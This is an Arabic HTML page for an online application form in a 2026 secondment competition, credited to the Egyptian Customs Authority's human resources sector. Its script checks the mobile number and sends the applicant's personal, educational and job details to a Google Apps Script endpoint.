<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>استمارة التقديم الإلكتروني – مسابقة الندب</title>

<style>
body {
    font-family: Tahoma, Arial, sans-serif;
    background:#f4f4f4;
    margin:0;
}
.page {
    max-width:1100px;
    margin:20px auto;
    background:#fff;
    border:1px solid #ccc;
    padding:25px;
}
.header {
    display:flex;
    justify-content:space-between;
    align-items:center;
    border-bottom:2px solid #000;
    padding-bottom:15px;
}
.header img { height:70px; }
.header h1 {
    font-size:20px;
    text-align:center;
    flex:1;
}
.form-group {
    display:grid;
    grid-template-columns:1fr 1fr;
    gap:15px;
    margin-bottom:20px;
}
label { font-weight:bold; }
input, select {
    padding:8px;
    width:100%;
}
h2 {
    border-bottom:1px solid #000;
    padding-bottom:5px;
    margin-top:30px;
}
.course {
    border:1px dashed #999;
    padding:15px;
    margin-bottom:15px;
}
.add-btn {
    background:#0a5aa5;
    color:#fff;
    border:none;
    padding:10px 18px;
    cursor:pointer;
}
.submit-btn {
    background:#000;
    color:#fff;
    border:none;
    padding:12px;
    width:100%;
    font-size:16px;
    cursor:pointer;
}
#formMessage {
    display:none;
    margin-top:20px;
    padding:15px;
}
footer {
    text-align:center;
    margin-top:25px;
    color:#555;
    font-size:13px;
}
</style>
</head>

<body>

<div class="page">

<div class="header">
    <img src="logo-right.png">
    <h1>استمارة التقديم الإلكتروني<br>لمسابقة الندب رقم ١ لعام ٢٠٢٦</h1>
    <img src="logo-left.png">
</div>

<form id="applicationForm" onsubmit="submitForm(event)">

<h2>البيانات الشخصية</h2>
<div class="form-group">
    <div>
        <label>الرقم القومي</label>
        <input type="text" id="nationalId" required maxlength="14">
    </div>
    <div>
        <label>الاسم بالكامل</label>
        <input type="text" id="fullName" required>
    </div>
    <div>
        <label>رقم الموبايل</label>
        <input type="text" id="mobile" required maxlength="11">
    </div>
    <div>
        <label>النوع</label>
        <select id="gender">
            <option>ذكر</option>
            <option>أنثى</option>
        </select>
    </div>
    <div>
        <label>تاريخ الميلاد</label>
        <input type="date" id="birthDate">
    </div>
</div>

<h2>بيانات المؤهل الجامعي</h2>
<div class="form-group">
    <div><label>اسم الجامعة</label><input id="university"></div>
    <div><label>الكلية</label><input id="faculty"></div>
    <div><label>المؤهل الجامعي</label><input id="qualification"></div>
    <div><label>التقدير العام</label><input id="grade"></div>
</div>

<h2>البيانات الوظيفية</h2>
<div class="form-group">
    <div><label>جهة العمل</label><input id="workPlace"></div>
    <div><label>الوظيفة الحالية</label><input id="currentJob"></div>
    <div><label>تاريخ التعيين</label><input type="date" id="hireDate"></div>
    <div><label>المستوى الوظيفي</label><input id="level"></div>
    <div style="grid-column:1/3">
        <label>الوظيفة المتقدم إليها</label>
        <input id="appliedJob">
    </div>
</div>

<h2>الدورات التدريبية</h2>
<div id="courses"></div>
<button type="button" class="add-btn" onclick="addCourse()">➕ إضافة دورة</button>

<div style="margin-top:20px">
    <label>
        <input type="checkbox" required>
        أقر بأن جميع البيانات صحيحة وأتحمل المسئولية القانونية.
    </label>
</div>

<button type="submit" class="submit-btn">إرسال البيانات</button>

<div id="formMessage"></div>

</form>

<footer>© مصلحة الجمارك المصرية – قطاع الموارد البشرية</footer>

</div>

<script>
function addCourse(){
    const div=document.createElement("div");
    div.className="course";
    div.innerHTML=`
        <div class="form-group">
            <div><label>اسم الدورة</label><input></div>
            <div><label>مكان الدورة</label><input></div>
            <div><label>المدة</label><input></div>
            <div><label>تاريخ الدورة</label><input type="date"></div>
        </div>`;
    document.getElementById("courses").appendChild(div);
}

function showMessage(text,type){
    const box=document.getElementById("formMessage");
    box.style.display="block";
    box.innerText=text;
    if(type==="error"){
        box.style.background="#ffe6e6";
        box.style.border="1px solid red";
    } else {
        box.style.background="#e6ffe6";
        box.style.border="1px solid green";
    }
}

function submitForm(e){
    e.preventDefault();

    const mobile=document.getElementById("mobile").value;
    if(!/^\d{11}$/.test(mobile)){
        showMessage("⚠️ رقم الموبايل يجب أن يكون ١١ رقم فقط","error");
        return;
    }

    const courses=[];
    document.querySelectorAll(".course").forEach(c=>{
        const i=c.querySelectorAll("input");
        courses.push({
            name:i[0].value,
            place:i[1].value,
            duration:i[2].value,
            date:i[3].value
        });
    });

    const data={
        nationalId:nationalId.value,
        fullName:fullName.value,
        mobile:mobile,
        gender:gender.value,
        birthDate:birthDate.value,
        university:university.value,
        faculty:faculty.value,
        qualification:qualification.value,
        grade:grade.value,
        workPlace:workPlace.value,
        currentJob:currentJob.value,
        hireDate:hireDate.value,
        level:level.value,
        appliedJob:appliedJob.value,
        courses:courses
    };

    fetch("https://script.google.com/macros/s/AKfycbydhFPE-OeI4vdzG0woj1U5PGAOZAHtAec0lFN7GdbQm_hhNxMT7TbzhyVthIe1dr30/exec",{
        method:"POST",
        body:JSON.stringify(data)
    })
    .then(r=>r.text())
    .then(res=>{
        if(res==="EXISTS"){
            showMessage("⚠️ هذا الرقم القومي مسجل بالفعل","error");
        } else {
            showMessage("✅ تم تسجيل البيانات بنجاح","success");
            applicationForm.reset();
            courses.innerHTML="";
        }
    })
    .catch(()=>{
        showMessage("❌ حدث خطأ أثناء الإرسال","error");
    });
}
</script>

</body>
</html>
